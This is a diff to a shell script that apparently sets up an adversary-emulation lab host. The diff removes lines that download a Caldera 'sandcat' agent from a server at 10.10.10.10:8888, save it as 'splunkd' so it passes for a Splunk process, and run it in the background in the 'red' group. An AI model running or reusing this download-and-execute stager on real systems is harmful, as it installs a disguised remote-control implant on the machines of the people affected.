@@ -1,11 +1,1 @@
 ip a add 10.10.10.11/24 dev eth0
-
-server="http://10.10.10.10:8888";
-
-until curl --output /dev/null --silent --fail $server; do
-    sleep 1
-done
-
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
-chmod +x splunkd;
-./splunkd -server $server -group red -v &
